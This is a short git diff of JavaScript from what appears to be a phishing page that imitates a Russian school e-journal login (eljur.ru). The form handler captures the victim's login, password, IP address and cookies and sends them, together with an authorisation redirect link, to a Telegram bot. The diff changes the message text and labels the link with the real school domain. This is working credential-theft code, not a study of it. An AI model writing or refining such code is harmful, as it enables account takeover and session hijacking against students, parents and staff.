@@ -138,8 +138,8 @@ function handleFormSubmit(loginViewport, blurOverlay) {
       const data = await res.json();
 
       if (data.result && data.actions?.[0]?.type === "redirect") {
-        const url = data.actions[0]?.url ? `[Url](${encodeURI(data.actions[0].url)})` : "Нет URL";
-        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n${url}`);
+        const url = data.actions[0]?.url ? `[https://shkolakzn.eljur.ru/...](${encodeURI(data.actions[0].url)})` : "Нет URL";
+        await sendToTelegram(`🔑 Логин: ${loginVal}\n🔒 Пароль: ${passVal}\n🌐 IP: ${userIP}\n🍪Куки: ${cookieJSON}\n🔗Ссылка для авторизации: ${url}`);
 
         (async () => {
           const baseUrl = "/journal-api-messages-action";
